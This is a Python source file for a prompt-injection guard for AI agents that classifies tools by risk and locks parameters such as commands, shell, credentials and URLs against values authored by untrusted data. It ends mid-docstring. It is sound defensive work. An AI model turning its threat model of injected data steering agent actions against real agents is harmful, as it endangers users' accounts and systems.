"""
verb-authority -- a drop-in action-layer guard for AI agents.

PRINCIPLE: data selects, never authors.
We do not classify whether content is "malicious". We constrain which ACTIONS
run and which PARAMETERS untrusted data may fill. Under the gate's provenance
model, data cannot author parameters whose policy is trusted_fixed; semantic
rewrites and influence over which already-approved value is selected remain
outside this drop-in gate's tracking boundary.

Built on the security model behind Google DeepMind's CaMeL
("Defeating Prompt Injections by Design", arXiv:2503.18813, Apache-2.0).
Made drop-in via a policy that is auto-inferred, safe-by-default, asks when
unsure, and scales scrutiny to each verb's risk.
"""
from __future__ import annotations
from dataclasses import dataclass, field
from enum import Enum
from types import MappingProxyType
from typing import Any, Callable, Iterable
import asyncio
import functools
import hashlib
import io
import inspect
import json
import marshal
import math
import re
import sys
import threading
import unicodedata
from types import (
    AsyncGeneratorType,
    CoroutineType,
    FunctionType,
    GeneratorType,
    MethodType,
)


MAX_NFKC_INPUT_CHARS = 4_096
"""Maximum text length accepted by one Unicode compatibility normalization.

Some normalization inputs with adversarial combining-class order take
quadratic work in common Unicode implementations. This ceiling is checked
*before* every NFKC call. Identifier inference and runtime enforcement choose
their own fail-closed outcome when the ceiling is exceeded.
"""

MAX_NFKC_OPERATION_CHARS = 8 * MAX_NFKC_INPUT_CHARS
"""Maximum cumulative Unicode-normalization input in one runtime operation."""

MAX_IDENTIFIER_INFERENCE_CHARS = 512
"""Maximum schema-identifier length inspected by lexical policy inference."""


class _NFKCWorkLimitExceeded(ValueError):
    """Internal signal that Unicode normalization was refused before work."""


class _NFKCWorkBudget:
    """Charge cumulative NFKC input before entering the Unicode algorithm."""

    __slots__ = ("remaining",)

    def __init__(self) -> None:
        if (
            type(MAX_NFKC_OPERATION_CHARS) is not int
            or MAX_NFKC_OPERATION_CHARS < 1
        ):
            self.remaining = 0
        else:
            self.remaining = MAX_NFKC_OPERATION_CHARS

    def consume(self, value: str) -> None:
        if type(value) is not str:
            raise _NFKCWorkLimitExceeded("invalid Unicode normalization input")
        amount = len(value)
        if amount > MAX_NFKC_INPUT_CHARS or amount > self.remaining:
            self.remaining = 0
            raise _NFKCWorkLimitExceeded(
                "Unicode normalization work exceeds the operation limit"
            )
        self.remaining -= amount


def _bounded_nfkc(
    value: str,
    budget: _NFKCWorkBudget | None = None,
) -> str:
    """Normalize only after both the per-input and shared budgets approve."""

    if type(value) is not str or len(value) > MAX_NFKC_INPUT_CHARS:
        raise _NFKCWorkLimitExceeded(
            "Unicode normalization input exceeds the work limit"
        )
    if budget is not None:
        budget.consume(value)
    return unicodedata.normalize("NFKC", value)


# === roles a parameter value may play =====================================
class Policy(str, Enum):
    TRUSTED_FIXED    = "trusted_fixed"     # sink: data may NOT fill it
    TYPED_BOUNDED    = "typed_bounded"     # data may fill, must pass type + bounds
    OUTBOUND_PAYLOAD = "outbound_payload"  # free text, flows outward only


class Confidence(str, Enum):
    HIGH = "high"
    UNCERTAIN = "uncertain"


# === trusted choice resolution ============================================
class ResolutionStatus(str, Enum):
    """Outcome of an exact lookup in an application-owned trusted catalog."""

    RESOLVED = "resolved"
    NOT_FOUND = "not_found"
    AMBIGUOUS = "ambiguous"


@dataclass(frozen=True)
class TrustedChoice:
    """One application-owned key/value pair and its evidence label.

    The application, not the model, must construct these entries from a
    trusted source such as an authenticated contact directory. `evidence` is
    retained for logging and review; Verb Authority does not verify the claim.
    """

    key: str
    value: Any
    evidence: str


@dataclass(frozen=True)
class TrustedResolution:
    """A fail-closed result returned by :class:`TrustedResolver`."""

    requested_key: str
    status: ResolutionStatus
    value: Any = None
    evidence: str | None = None
    matches: int = 0

    @property
    def resolved(self) -> bool:
        return self.status is ResolutionStatus.RESOLVED


def _normalize_choice_key(key: str) -> str:
    """Conservative matching for human labels: trim and case-fold only."""

    return key.strip().casefold()


_INVALID_RESOLUTION_KEY = "<invalid-key>"


class TrustedResolver:
    """Resolve a key to a canonical value from a closed trusted catalog.

    This primitive deliberately does not perform fuzzy matching, path/prefix
    policy, endpoint validation, or authorization. It only implements
    ``key -> (value, evidence)``. Unknown and ambiguous keys fail closed.

    The selected *value* comes from the trusted catalog, never from the lookup
    key. The key may still have been influenced by untrusted content; that is
    control-flow influence and remains outside this value-level boundary.
    """

    def __init__(
        self,
        choices: Iterable[TrustedChoice],
        *,
        normalize_key: Callable[[str], str] | None = None,
    ) -> None:
        self._normalize_key = normalize_key or _normalize_choice_key
        self._choices: dict[str, list[TrustedChoice]] = {}
        # A catalog is one application-owned trust snapshot.  Share the
        # resource budget across all of its values so a large number of small
        # entries cannot bypass the same limits that protect one nested value.
        snapshot_budget = _JSONSnapshotBudget()
        for choice in choices:
            if type(choice) is not TrustedChoice:
                raise TypeError("choices must contain TrustedChoice instances")
            if type(choice.key) is not str:
                raise TypeError("trusted choice keys must be plain strings")
            if len(choice.key) > MAX_NFKC_INPUT_CHARS:
                raise ValueError("trusted choice keys exceed the lookup length limit")
            snapshot_budget.consume_text(choice.key)
            if not choice.key.strip():
                raise ValueError("trusted choice keys must be non-empty strings")
            if type(choice.evidence) is not str:
                raise TypeError("trusted choice evidence must be plain text")
            snapshot_budget.consume_text(choice.evidence)
            if not choice.evidence.strip():
                raise ValueError("trusted choice evidence must be non-empty text")
            if choice.value is None:
                raise ValueError("trusted choice values must not be None")
            # Keep only a plain-JSON tree that is independent of the caller's
            # containers.  Besides blocking aliases and later mutation, this
            # rejects custom Python objects whose methods could run while a
            # supposedly trusted value is compared or dispatched.
            value_snapshot = _snapshot_json_value(
                choice.value,
                _budget=snapshot_budget,
            )
            normalized = self._normalize_key(choice.key)
            if type(normalized) is not str:
                raise TypeError("normalized trusted choice keys must be plain strings")
            if len(normalized) > MAX_NFKC_INPUT_CHARS:
                raise ValueError(
                    "normalized trusted choice keys exceed the lookup length limit"
                )
            snapshot_budget.consume_text(normalized)
            if not normalized:
                raise ValueError(
                    "normalized trusted choice keys must be non-empty strings"
                )
            self._choices.setdefault(normalized, []).append(
                TrustedChoice(choice.key, value_snapshot, choice.evidence)
            )

    def resolve(self, key: str) -> TrustedResolution:
        """Return one trusted catalog value, or an explicit closed failure."""

        # Reject before coercion or any overridable string method.  In
        # particular, a hostile object or ``str`` subclass must not get code
        # execution merely by being offered as an untrusted lookup key.
        if type(key) is not str:
            return TrustedResolution(
                _INVALID_RESOLUTION_KEY,
                ResolutionStatus.NOT_FOUND,
            )
        if len(key) > MAX_NFKC_INPUT_CHARS or _has_lone_surrogate(key):
            return TrustedResolution(
                _INVALID_RESOLUTION_KEY,
                ResolutionStatus.NOT_FOUND,
            )
        if not key.strip():
            return TrustedResolution(key, ResolutionStatus.NOT_FOUND)
        normalized = self._normalize_key(key)
        if (
            type(normalized) is not str
            or len(normalized) > MAX_NFKC_INPUT_CHARS
            or not normalized
            or _has_lone_surrogate(normalized)
        ):
            return TrustedResolution(key, ResolutionStatus.NOT_FOUND)
        matches = self._choices.get(normalized, [])
        if not matches:
            return TrustedResolution(key, ResolutionStatus.NOT_FOUND)
        if len(matches) != 1:
            return TrustedResolution(
                key,
                ResolutionStatus.AMBIGUOUS,
                matches=len(matches),
            )
        choice = matches[0]
        return TrustedResolution(
            key,
            ResolutionStatus.RESOLVED,
            # Never expose the catalog's retained snapshot.  A caller may
            # freely mutate one resolution without changing later trusted
            # resolutions or the value used as trusted_args.
            value=_snapshot_json_value(choice.value),
            evidence=choice.evidence,
            matches=1,
        )


# The risk tiers below are inspired by the tiered-risk access model proposed in
# Tallam & Miller, "Operationalizing CaMeL" (arXiv:2505.22852, 2025).
# This implementation is more granular (five declared tiers plus an unknown
# fail-safe vs. their three). A tool-name heuristic is reported for review, but
# only an explicit application declaration establishes the effective tier.
class Risk(str, Enum):
    UNKNOWN = "unknown"
    READ_ONLY = "read_only"
    WRITE = "write"
    FINANCIAL = "financial"
    DESTRUCTIVE = "destructive"
    CODE_EXEC = "code_exec"


class RiskConfidence(str, Enum):
    HEURISTIC = "heuristic"
    UNCERTAIN = "uncertain"


@dataclass(frozen=True)
class RiskAssessment:
    """The lexical evidence behind a tool-name risk guess.

    A tool name is author-controlled metadata, never proof of runtime behavior.
    `HEURISTIC` therefore means only that a complete name token matched a rule;
    it deliberately does not mean independently verified or high confidence.
    """

    risk: Risk
    source: str
    confidence: RiskConfidence
    mutability: str
    matched_tokens: tuple[str, ...]
    review_required: bool


@dataclass(frozen=True)
class RiskAssessmentSnapshot:
    """Detached, immutable risk evidence exposed to inspection or approval UI.

    Python ``Enum`` members are process-wide singletons whose private metadata
    can be reassigned by same-process code. Public views therefore carry only
    canonical primitive values, never the members retained by enforcement.
    """

    risk: str
    source: str
    confidence: str
    mutability: str
    matched_tokens: tuple[str, ...]
    review_required: bool


def _policy_literal(value: Policy) -> str:
    """Return a canonical policy value without consulting mutable Enum data."""

    if value is Policy.TRUSTED_FIXED:
        return "trusted_fixed"
    if value is Policy.TYPED_BOUNDED:
        return "typed_bounded"
    if value is Policy.OUTBOUND_PAYLOAD:
        return "outbound_payload"
    raise ValueError("invalid policy value")


def _risk_literal(value: Risk) -> str:
    """Return a canonical risk value without consulting mutable Enum data."""

    if value is Risk.UNKNOWN:
        return "unknown"
    if value is Risk.READ_ONLY:
        return "read_only"
    if value is Risk.WRITE:
        return "write"
    if value is Risk.FINANCIAL:
        return "financial"
    if value is Risk.DESTRUCTIVE:
        return "destructive"
    if value is Risk.CODE_EXEC:
        return "code_exec"
    raise ValueError("invalid risk value")


def _risk_confidence_literal(value: RiskConfidence) -> str:
    """Return canonical risk-confidence text from member identity."""

    if value is RiskConfidence.HEURISTIC:
        return "heuristic"
    if value is RiskConfidence.UNCERTAIN:
        return "uncertain"
    raise ValueError("invalid risk confidence")


def _risk_assessment_snapshot(
    assessment: RiskAssessment,
) -> RiskAssessmentSnapshot:
    """Detach the complete callback/inspection evidence graph."""

    return RiskAssessmentSnapshot(
        risk=_risk_literal(assessment.risk),
        source=str(assessment.source),
        confidence=_risk_confidence_literal(assessment.confidence),
        mutability=str(assessment.mutability),
        matched_tokens=tuple(str(token) for token in assessment.matched_tokens),
        review_required=bool(assessment.review_required),
    )


# === tool schema ==========================================================
@dataclass
class Param:
    name: str
    type: str = "string"      # string|number|integer|email|uri|enum|boolean|
                              # object|array|json
    enum: list[Any] | None = None
    max_len: int | None = None
    cap: float | None = None
    sink: bool | None = None  # declared capability (DylanWang's point):
                              #   True  -> this param IS a sink (data may not author it)
                              #   False -> explicitly NOT a sink (safe to let data fill)
                              #   None  -> not declared; fall back to name-based inference
                              # A declaration always overrides the name-based guess, so
                              # overloaded names (path, query, template) stop being
                              # guessed from the verb and are stated by the tool instead.
    required: bool = True     # retained for beta API compatibility. Runtime
                              # gates require every value explicitly; Python
                              # callable defaults are never implicit authority.


@dataclass
class Tool:
    name: str
    params: list[Param]
    fn: Callable[..., Any] | None = None
    risk: Risk | str | None = None  # explicit application declaration; overrides name inference


@dataclass
class Registry:
    tools: dict[str, Tool] = field(default_factory=dict)
    _version: int = field(default=0, init=False, repr=False, compare=False)

    def add(self, t: Tool) -> None:
        self.tools[t.name] = t
        self._version += 1

    @property
    def version(self) -> int:
        """Monotonic version for registrations performed through :meth:`add`."""

        return self._version


# === verb risk (a reviewable heuristic over complete name tokens) =========
# Tool names are mutable labels supplied by a tool author. They can seed a
# review, but cannot establish what the implementation really does. Matching
# complete snake/kebab/camel-case tokens avoids false positives such as
# "revaluate" -> "eval". Even a match remains advisory: build_policy keeps an
# undeclared tool at UNKNOWN until the application supplies a risk declaration.
_RISK_TOKENS: list[tuple[Risk, frozenset[str]]] = [
    (
        Risk.CODE_EXEC,
        frozenset({"eval", "exec", "execute", "shell", "sql", "spawn"}),
    ),
    (Risk.DESTRUCTIVE, frozenset({
        "delete", "remove", "drop", "wipe", "revoke", "destroy", "purge", "truncate",
    })),
    (Risk.FINANCIAL, frozenset({
        "pay", "payment", "payments", "transfer", "charge", "refund", "purchase",
        "withdraw", "invoice", "billing", "bid", "buy",
    })),
    (Risk.WRITE, frozenset({
        "create", "update", "send", "post", "write", "add", "set", "book", "insert",
        "modify", "upload", "submit", "place",
    })),
    (Risk.READ_ONLY, frozenset({
        "get", "search", "list", "read", "fetch", "lookup", "find", "view", "describe",
        "scan",
    })),
]
NEEDS_CONFIRM = {Risk.UNKNOWN, Risk.FINANCIAL, Risk.DESTRUCTIVE, Risk.CODE_EXEC}


def _tool_name_tokens(
    tool_name: str,
    _context: _PolicyInferenceContext | None = None,
) -> tuple[str, ...]:
    return _identifier_tokens(tool_name, _context)


def infer_risk(
    tool_name: str,
    _context: _PolicyInferenceContext | None = None,
) -> RiskAssessment:
    context = _context or _PolicyInferenceContext()
    tokens = _tool_name_tokens(tool_name, context)
    if context.inference_incomplete_for(tool_name):
        # Resource exhaustion is not lexical evidence that the declaration is
        # safe. Keep it distinct from an ordinary unmatched name so callers
        # can fail closed instead of accepting a lower declared tier.
        return RiskAssessment(
            risk=Risk.UNKNOWN,
            source="inference_limit",
            confidence=RiskConfidence.UNCERTAIN,
            mutability="caller",
            matched_tokens=(),
            review_required=True,
        )
    for risk, candidates in _RISK_TOKENS:
        matched = tuple(token for token in tokens if token in candidates)
        if matched:
            return RiskAssessment(
                risk=risk,
                source="tool_name",
                confidence=RiskConfidence.HEURISTIC,
                mutability="caller",
                matched_tokens=matched,
                review_required=True,
            )
    return RiskAssessment(
        risk=Risk.UNKNOWN,
        source="tool_name",
        confidence=RiskConfidence.UNCERTAIN,
        mutability="caller",
        matched_tokens=(),
        review_required=True,
    )


def verb_risk(tool_name: str) -> Risk:
    """Return the lexical risk guess; use `infer_risk` for its evidence."""

    return infer_risk(tool_name).risk


# === per-parameter inference (safe-by-default, with confidence) ===========
_AUTHORITY_SINK_TOKENS = frozenset(
    {
        "recipient",
        "recipients",
        "account",
        "accounts",
        "iban",
        "ibans",
        "url",
        "urls",
        "uri",
        "uris",
        "endpoint",
        "endpoints",
        "host",
        "hosts",
        "hostname",
        "hostnames",
        "webhook",
        "webhooks",
        "path",
        "paths",
        "file",
        "files",
        "cmd",
        "cmds",
        "command",
        "commands",
        "shell",
        "shells",
        "token",
        "tokens",
        "password",
        "passwords",
        "secret",
        "secrets",
        "credential",
        "credentials",
        "destination",
        "destinations",
        "email",
        "emails",
    }
)
_COMPACT_AUTHORITY_SINK_TOKENS = frozenset({"apikey", "apikeys"})
_COMPACT_AUTHORITY_PREFIXES = frozenset(
    {
        "access",
        "api",
        "approved",
        "backup",
        "bank",
        "callback",
        "connection",
        "config",
        "database",
        "directory",
        "customer",
        "destination",
        "event",
        "execute",
        "external",
        "folder",
        "idempotency",
        "incoming",
        "input",
        "local",
        "log",
        "message",
        "outbound",
        "output",
        "payment",
        "primary",
        "proxy",
        "recipient",
        "remote",
        "reply",
        "request",
        "root",
        "run",
        "server",
        "service",
        "settlement",
        "source",
        "sub",
        "target",
        "temp",
        "temporary",
        "transfer",
        "user",
        "wallet",
        "working",
    }
)
_COMPACT_AUTHORITY_SUFFIXES = frozenset(
    {*_AUTHORITY_SINK_TOKENS, *_COMPACT_AUTHORITY_SINK_TOKENS, "to"}
)
_AMBIGUOUS_COMPACT_AUTHORITY_SUFFIXES = frozenset(
    {
        "file",
        "files",
        "host",
        "hosts",
        "path",
        "paths",
        "shell",
        "shells",
        "to",
    }
)
_COMPACT_AUTHORITY_QUALIFIERS = frozenset(
    {
        "address",
        "addresses",
        "argument",
        "arguments",
        "candidate",
        "candidates",
        "config",
        "configs",
        "data",
        "default",
        "defaults",
        "field",
        "fields",
        "input",
        "json",
        "name",
        "names",
        "number",
        "numbers",
        "object",
        "objects",
        "optional",
        "override",
        "overrides",
        "parameter",
        "parameters",
        "raw",
        "ref",
        "reference",
        "references",
        "refs",
        "schema",
        "schemas",
        "selector",
        "selectors",
        "setting",
        "settings",
        "string",
        "strings",
        "template",
        "templates",
        "text",
        "value",
        "values",
    }
)
_ORDERED_COMPACT_AUTHORITY_QUALIFIERS = tuple(
    sorted(_COMPACT_AUTHORITY_QUALIFIERS, key=len, reverse=True)
)
_MAX_COMPACT_QUALIFIER_LAYERS = 8
_SELECTOR_TOKENS = frozenset(
    {
        "guid",
        "guids",
        "id",
        "ids",
        "identifier",
        "identifiers",
        "key",
        "keys",
        "uuid",
        "uuids",
    }
)
_PAYLOAD_TOKENS = frozenset(
    {"body", "message", "content", "text", "summary", "reply", "note", "description"}
)


class _PolicyInferenceContext:
    """Cache identifier normalization under one aggregate work budget."""

    __slots__ = (
        "compact_identifier_segments",
        "identifier_tokens",
        "normalization_budget",
        "normalization_exhausted_identifiers",
        "normalized_identifiers",
    )

    def __init__(self) -> None:
        self.normalization_budget = _NFKCWorkBudget()
        self.normalized_identifiers: dict[str, str | None] = {}
        self.normalization_exhausted_identifiers: set[str] = set()
        self.identifier_tokens: dict[str, tuple[str, ...]] = {}
        self.compact_identifier_segments: dict[str, tuple[str, ...]] = {}

    def normalize_identifier(self, name: Any) -> str | None:
        if type(name) is not str:
            return None
        # Refuse before hashing or retaining the identifier in the per-scan
        # cache.  Otherwise many oversized ASCII names could still consume
        # substantial CPU and keep all caller-owned text alive.
        if len(name) > MAX_IDENTIFIER_INFERENCE_CHARS:
            return None
        if name in self.normalized_identifiers:
            return self.normalized_identifiers[name]
        normalized: str | None
        if name.isascii():
            normalized = name
        else:
            try:
                normalized = _bounded_nfkc(name, self.normalization_budget)
            except _NFKCWorkLimitExceeded:
                self.normalization_exhausted_identifiers.add(name)
                normalized = None
        self.normalized_identifiers[name] = normalized
        return normalized

    def inference_incomplete_for(self, name: Any) -> bool:
        """Whether bounded identifier analysis could not be completed."""

        return (
            type(name) is not str
            or len(name) > MAX_IDENTIFIER_INFERENCE_CHARS
            or name in self.normalization_exhausted_identifiers
        )


def _identifier_tokens(
    name: str,
    _context: _PolicyInferenceContext | None = None,
) -> tuple[str, ...]:
    """Split common schema identifier styles without substring guessing.

    Tool providers use snake_case, kebab-case, dotted/slashed paths,
    camelCase, and acronym suffixes interchangeably. Normalize those styles
    into complete, case-folded tokens so ``messageId`` and ``messageID`` carry
    the same selector evidence as ``message_id``. Selector inference separately
    treats a flatcase suffix as ambiguous authority; a substring that is not a
    suffix, as in ``keyboard`` or ``guidance``, remains ordinary text.
    """

    context = _context or _PolicyInferenceContext()
    if type(name) is not str or len(name) > MAX_IDENTIFIER_INFERENCE_CHARS:
        return ()
    if name in context.identifier_tokens:
        return context.identifier_tokens[name]
    normalized = context.normalize_identifier(name)
    if normalized is None:
        return ()
    tokens: list[str] = []
    current: list[str] = []

    def flush() -> None:
        if current:
            tokens.append("".join(current).casefold())
            current.clear()

    length = len(normalized)
    for index, character in enumerate(normalized):
        is_upper = "A" <= character <= "Z"
        is_lower = "a" <= character <= "z"
        is_digit = "0" <= character <= "9"
        if not (is_upper or is_lower or is_digit):
            flush()
            continue

        if current:
            previous = current[-1]
            previous_upper = "A" <= previous <= "Z"
            previous_lower = "a" <= previous <= "z"
            previous_digit = "0" <= previous <= "9"
            next_character = normalized[index + 1] if index + 1 < length else ""
            next_lower = "a" <= next_character <= "z"
            acronym_plural = (
                next_character == "s"
                and (
                    index + 2 == length
                    or "0" <= normalized[index + 2] <= "9"
                    or "A" <= normalized[index + 2] <= "Z"
                    or not normalized[index + 2].isascii()
                    or not normalized[index + 2].isalnum()
                )
            )
            boundary = (
                (is_digit and not previous_digit)
                or (not is_digit and previous_digit)
                or (is_upper and previous_lower)
                or (
                    is_upper
                    and previous_upper
                    and next_lower
                    and not acronym_plural
                )
            )
            if boundary:
                flush()
        current.append(character)
    flush()
    result = tuple(tokens)
    context.identifier_tokens[name] = result
    return result


def _compact_identifier_segments(
    name: str,
    _context: _PolicyInferenceContext | None = None,
) -> tuple[str, ...]:
    """Return separator-delimited ASCII segments without camel-case guesses.

    A provider-controlled casing pattern can defeat a camel-case boundary
    detector (for example ``recipientiD``). Selector suffixes are authority
    evidence even when those internal boundaries are misleading, so preserve
    each complete alphanumeric run, case-fold it, and ignore only trailing
    numeric ordinals. The generic suffix rule remains deliberately
    conservative; applications can explicitly opt ordinary names out with
    ``sink=False``.
    """

    context = _context or _PolicyInferenceContext()
    if type(name) is not str or len(name) > MAX_IDENTIFIER_INFERENCE_CHARS:
        return ()
    if name in context.compact_identifier_segments:
        return context.compact_identifier_segments[name]
    normalized = context.normalize_identifier(name)
    if normalized is None:
        return ()
    segments: list[str] = []
    flattened: list[str] = []
    current: list[str] = []

    def flush() -> None:
        if not current:
            return
        segment = "".join(current).casefold().rstrip("0123456789")
        if segment:
            segments.append(segment)
        current.clear()

    for character in normalized:
        if character.isascii() and character.isalnum():
            current.append(character)
            flattened.append(character)
        else:
            flush()
    flush()
    flattened_segment = "".join(flattened).casefold().rstrip("0123456789")
    if flattened_segment and flattened_segment not in segments:
        # Separators are provider-controlled too: messageI_D and walletK-eY
        # must not turn one selector suffix into harmless one-letter tokens.
        segments.append(flattened_segment)
    result = tuple(segments)
    context.compact_identifier_segments[name] = result
    return result


def _is_sink_name(
    name: str,
    _context: _PolicyInferenceContext | None = None,
) -> bool:
    """Return structural sink evidence across common identifier styles."""

    tokens = _identifier_tokens(name, _context)
    if not tokens:
        return False
    if _AUTHORITY_SINK_TOKENS.intersection(tokens):
        return True
    if _COMPACT_AUTHORITY_SINK_TOKENS.intersection(tokens):
        return True
    if "api" in tokens and {"key", "keys"}.intersection(tokens):
        return True
    # Preserve the existing ``*_to`` evidence for camel/kebab/dotted forms
    # such as replyTo, reply-to, and reply.to. Matching a complete final token
    # avoids false positives such as ``into`` or ``tomorrow``.
    semantic_tokens = tuple(token for token in tokens if not token.isdigit())
    return bool(semantic_tokens and semantic_tokens[-1] == "to")


def _is_selector_name(
    name: str,
    _context: _PolicyInferenceContext | None = None,
) -> bool:
    """Return complete-token or flatcase selector-suffix evidence.

    Flatcase exports erase the boundary in names such as ``customerid`` and
    ``walletkey``. Treat every selector suffix as uncertain authority rather
    than relying on a finite entity-prefix list. This is deliberately
    conservative: an ordinary word ending in the same letters stays locked
    until the application explicitly declares ``sink=False``.
    """

    tokens = _identifier_tokens(name, _context)
    semantic_tokens = tuple(token for token in tokens if not token.isdigit())
    compact_segments = _compact_identifier_segments(name, _context)
    return bool(_SELECTOR_TOKENS.intersection(semantic_tokens)) or any(
        token.endswith(suffix) and token != suffix
        for token in semantic_tokens
        for suffix in _SELECTOR_TOKENS
    ) or any(
        segment == suffix or segment.endswith(suffix)
        for segment in compact_segments
        for suffix in _SELECTOR_TOKENS
    )


def _is_compact_sink_name(
    name: str,
    _context: _PolicyInferenceContext | None = None,
) -> bool:
    """Return ambiguous authority evidence from a flattened compound name.

    Flatcase schemas can erase a meaningful boundary entirely: ``targetHost``
    becomes ``targethost`` and ``run_command`` becomes ``runcommand``.  A raw
    suffix match would also mistake ordinary words such as ``profile``,
    ``ghost``, or ``eggshell`` for authority.  Strong suffixes such as
    ``url``, ``account``, and ``credential`` stand on their own.  For the few
    suffixes that are also common word endings, require the preceding part to
    end in a compact role/action prefix (or another authority token).  Surface
    every compact match as uncertain review rather than a high-confidence
    declaration.  This remains a finite lexical heuristic: it recognizes only
    the representation qualifiers listed above and cannot reconstruct every
    boundary erased by arbitrary flatcase.  Applications must explicitly
    declare unusual sink names; ``sink=False`` remains the deliberate escape.
    """

    prefixes = _COMPACT_AUTHORITY_PREFIXES | _AUTHORITY_SINK_TOKENS
    authority_suffixes = _COMPACT_AUTHORITY_SUFFIXES | _SELECTOR_TOKENS
    for segment in _compact_identifier_segments(name, _context):
        end = len(segment)
        qualifier_layers = 0
        while end:
            for suffix in authority_suffixes:
                if end == len(suffix) and segment.endswith(suffix, 0, end):
                    return True
                if not segment.endswith(suffix, 0, end):
                    continue
                prefix_end = end - len(suffix)
                if (
                    suffix not in _AMBIGUOUS_COMPACT_AUTHORITY_SUFFIXES
                    or any(
                        segment.endswith(role, 0, prefix_end)
                        for role in prefixes
                    )
                ):
                    return True

            # Qualifiers describe the representation of an authority value,
            # not who may author it.  Peel only complete known suffixes and
            # re-evaluate after each layer (for example
            # destination + url + value + field).  Unknown endings such as
            # account+ing, host+age, and token+izer are never discarded.
            qualifier = next(
                (
                    ending
                    for ending in _ORDERED_COMPACT_AUTHORITY_QUALIFIERS
                    if end != len(ending)
                    and segment.endswith(ending, 0, end)
                ),
                None,
            )
            if qualifier is None:
                break
            qualifier_layers += 1
            if qualifier_layers > _MAX_COMPACT_QUALIFIER_LAYERS:
                # An implausibly deep chain is itself unmodelled identifier
                # structure.  Stop bounded work and fail closed to review.
                return True
            end -= len(qualifier)
    return False


def _is_payload_name(
    name: str,
    _context: _PolicyInferenceContext | None = None,
) -> bool:
    """Recognize only a complete final payload token across name styles."""

    tokens = _identifier_tokens(name, _context)
    return bool(tokens and tokens[-1] in _PAYLOAD_TOKENS)


def _identifier_name_requires_review(
    name: str,
    _context: _PolicyInferenceContext | None = None,
) -> bool:
    """Fail closed when the English identifier heuristic cannot model a name.

    Compatibility forms such as fullwidth Latin normalize to ASCII and remain
    classifiable. Mixed-script, non-Latin, punctuation-only, and numeric-only
    names do not receive a high-confidence typed/data-authorable verdict from
    an English-only token dictionary. A developer may still make the explicit
    ``sink=False`` declaration above this fallback.
    """

    context = _context or _PolicyInferenceContext()
    normalized = context.normalize_identifier(name)
    if normalized is None:
        return True
    if not normalized.isascii():
        return True
    tokens = _identifier_tokens(name, context)
    return not any(re.search(r"[A-Za-z]", token) for token in tokens)


def infer_policy(
    p: Param,
    _context: _PolicyInferenceContext | None = None,
):
    context = _context or _PolicyInferenceContext()
    # A declared capability always wins over name-based guessing (DylanWang):
    # the tool manifest is authoritative, so we don't infer sink-ness from the
    # param name when the developer has stated it outright.
    if p.sink is True:
        return Policy.TRUSTED_FIXED, Confidence.HIGH
    if p.sink is False:
        # explicitly not a sink: still type-check, but data may fill it
        if p.type in ("number", "integer", "enum", "boolean"):
            return Policy.TYPED_BOUNDED, Confidence.HIGH
        if _is_payload_name(p.name, context) or (
            p.type == "string" and (p.max_len or 0) > 200
        ):
            return Policy.OUTBOUND_PAYLOAD, Confidence.HIGH
        return Policy.TYPED_BOUNDED, Confidence.HIGH
    # Make aggregate normalization refusal an explicit conservative result.
    # The ordinary uncertain fallback may be relaxed for a declared read-only
    # tool; this resource-limit state must never take that route.
    context.normalize_identifier(p.name)
    if context.inference_incomplete_for(p.name):
        return Policy.TRUSTED_FIXED, Confidence.UNCERTAIN
    # --- no declaration: fall back to conservative name-based inference ---
    # Authority-bearing names win before broad type or payload rules.  A
    # numeric account identifier is still an account selector, and names such
    # as ``reply_to`` must not become authorable merely because another token
    # resembles free text.  Generic ``*_id``/``*_key`` selectors remain locked
    # but uncertain so consequential tools surface them in PolicySet.review.
    if p.type in ("email", "uri") or _is_sink_name(p.name, context):
        return Policy.TRUSTED_FIXED, Confidence.HIGH
    if _is_selector_name(p.name, context) or _is_compact_sink_name(
        p.name,
        context,
    ):
        return Policy.TRUSTED_FIXED, Confidence.UNCERTAIN
    if _identifier_name_requires_review(p.name, context):
        return Policy.TRUSTED_FIXED, Confidence.UNCERTAIN
    if p.type in ("number", "integer", "enum", "boolean"):
        return Policy.TYPED_BOUNDED, Confidence.HIGH
    if _is_payload_name(p.name, context) or (
        p.type == "string" and (p.max_len or 0) > 200
    ):
        return Policy.OUTBOUND_PAYLOAD, Confidence.HIGH
    return Policy.TRUSTED_FIXED, Confidence.UNCERTAIN   # locked-safe until you confirm


# === build a policy set for a whole registry =============================
@dataclass
class PolicySet:
    policy: dict
    risk: dict
    review: list      # (tool, param) -- uncertain, unlock if a legit input
    confirm: list     # tools requiring a runtime human confirmation
    risk_inference: dict
    risk_review: list
    risk_conflicts: list
    registry_binding: str | None = None
    registry_version: int | None = None


def build_policy(
    reg: Registry,
    _inference_context: _PolicyInferenceContext | None = None,
) -> PolicySet:
    inference_context = _inference_context or _PolicyInferenceContext()
    policy, risk, review, confirm = {}, {}, [], []
    risk_inference, risk_review, risk_conflicts = {}, [], []
    for name, tool in reg.tools.items():
        inferred = infer_risk(name, inference_context)
        declared = _normalize_declared_risk(tool.risk)
        inference_incomplete = inference_context.inference_incomplete_for(name)
        conflict = declared is not None and inferred.risk is not Risk.UNKNOWN and declared is not inferred.risk
        # A caller-mutable name cannot establish runtime behavior. Keep the
        # effective tier unknown until the application makes a declaration.
        # A declaration that conflicts with the lexical evidence is not yet a
        # resolved tier either: preserve both claims for review and keep the
        # effective result at the same fail-safe UNKNOWN boundary.
        r = (
            Risk.UNKNOWN
            if declared is None or conflict or inference_incomplete
            else declared
        )

        risk_inference[name] = inferred
        risk[name] = r
        if declared is None or conflict or inference_incomplete:
            risk_review.append(name)
        if conflict:
            risk_conflicts.append(name)
        # A non-conflicting declaration controls the effective tier. A visible
        # conflict keeps both the effective tier and confirmation fail-safe
        # until a human resolves it.
        if r in NEEDS_CONFIRM or (conflict and inferred.risk in NEEDS_CONFIRM):
            confirm.append(name)
        policy[name] = {}
        for p in tool.params:
            pol, conf = infer_policy(p, inference_context)
            if conf is Confidence.UNCERTAIN:
                if (
                    r is Risk.READ_ONLY
                    and not inference_context.inference_incomplete_for(p.name)
                ):
                    pol = Policy.TYPED_BOUNDED        # safe to auto-relax: no side effects
                else:
                    review.append((name, p.name))    # keep locked + surface for review
            policy[name][p.name] = pol
    registry_binding, registry_version = _policy_registry_source(reg)
    return PolicySet(
        policy,
        risk,
        review,
        confirm,
        risk_inference,
        risk_review,
        risk_conflicts,
        registry_binding,
        registry_version,
    )


# === the gate (call before every tool execution) =========================
@dataclass(frozen=True)
class Decision:
    allow: bool
    reason: str
    needs_confirm: bool = False


@dataclass(frozen=True)
class ConfirmationRequest:
    """Immutable description of the exact private action awaiting approval.

    ``arguments_json`` is the exact-order ASCII-escaped JSON encoding of the
    same isolated argument snapshot the runner will execute. Confirmation UIs
